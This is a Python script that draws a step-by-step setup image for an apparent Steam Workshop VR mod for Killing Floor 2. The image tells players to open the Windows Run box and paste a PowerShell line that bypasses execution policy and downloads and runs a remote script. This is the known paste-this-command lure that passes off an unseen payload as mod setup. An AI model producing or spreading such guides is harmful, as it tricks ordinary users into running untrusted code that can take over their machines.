"""Draws the Workshop page's step-by-step setup picture (docs/workshop/setup-guide.png)."""
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont

OUT = Path(__file__).resolve().parents[2] / "docs" / "workshop" / "setup-guide.png"
W, H = 1280, 1180
BG, CARD, TEXT, DIM, RED, GREEN = (17, 17, 17), (34, 34, 34), (238, 238, 238), (160, 160, 160), (178, 34, 34), (90, 130, 30)
FONTS = Path(r"C:\Windows\Fonts")


def font(size, bold=False):
    return ImageFont.truetype(str(FONTS / ("segoeuib.ttf" if bold else "segoeui.ttf")), size)


def key(draw, x, y, label, w=None):
    w = w or 26 + int(draw.textlength(label, font=font(30, True)))
    draw.rounded_rectangle((x, y, x + w, y + 64), 10, fill=(60, 60, 60), outline=(120, 120, 120), width=3)
    draw.rounded_rectangle((x + 4, y + 4, x + w - 4, y + 54), 8, fill=(80, 80, 80))
    draw.text((x + w / 2, y + 30), label, fill=TEXT, font=font(30, True), anchor="mm")
    return x + w


def button(draw, x, y, label, fill, w=260, h=60):
    draw.rounded_rectangle((x, y, x + w, y + h), 8, fill=fill)
    draw.text((x + w / 2, y + h / 2), label, fill="white", font=font(28, True), anchor="mm")


def main():
    image = Image.new("RGB", (W, H), BG)
    draw = ImageDraw.Draw(image)
    draw.text((W / 2, 60), "KF2VR - one-minute setup", fill=TEXT, font=font(52, True), anchor="mm")
    draw.text((W / 2, 112), "Do this once. After that, just press Play.", fill=DIM, font=font(28), anchor="mm")
    top, step_h = 160, 196
    steps = ["Click Subscribe on this page, then wait for the download to finish.",
             "Hold the Windows key and press R. A small Run box opens.",
             "Paste the line from this page into the box and press Enter.",
             "Click OK. Steam closes and opens again by itself.",
             "Press Play on Killing Floor 2 and pick Play in VR."]
    for i, words in enumerate(steps):
        y = top + i * step_h
        draw.rounded_rectangle((40, y, W - 40, y + step_h - 20), 16, fill=CARD)
        draw.ellipse((70, y + 52, 142, y + 124), fill=RED)
        draw.text((106, y + 88), str(i + 1), fill="white", font=font(40, True), anchor="mm")
        draw.text((175, y + 30), words, fill=TEXT, font=font(30))
        vy = y + 88
        if i == 0:
            button(draw, 175, vy, "+ Subscribe", GREEN)
        elif i == 1:
            x = key(draw, 175, vy, "Windows key", 240)
            draw.text((x + 30, vy + 30), "+", fill=TEXT, font=font(40, True), anchor="mm")
            key(draw, x + 60, vy, "R", 80)
        elif i == 2:
            draw.rectangle((175, vy - 4, 975, vy + 64), fill=(240, 240, 240), outline=(90, 90, 90), width=2)
            draw.text((185, vy + 30), "Open:", fill=(20, 20, 20), font=font(24), anchor="lm")
            draw.rectangle((265, vy + 8, 960, vy + 52), fill="white", outline=(0, 120, 215), width=2)
            draw.text((275, vy + 30), "powershell -ep bypass -c irm https://raw...KF2VR-Setup.ps1|iex",
                      fill=(20, 20, 20), font=font(20), anchor="lm")
            key(draw, 1010, vy, "Enter", 150)
        elif i == 3:
            button(draw, 175, vy, "OK", (0, 103, 192), 160)
        else:
            button(draw, 175, vy, "Play in VR (KF2-VR)", RED, 330)
            button(draw, 525, vy, "Play normally", (60, 60, 60), 260)
    draw.text((W / 2, H - 30), "To undo it, run the same line again.", fill=DIM, font=font(26), anchor="mm")
    OUT.parent.mkdir(parents=True, exist_ok=True)
    image.save(OUT, optimize=True)
    print(OUT, OUT.stat().st_size)


if __name__ == "__main__":
    main()
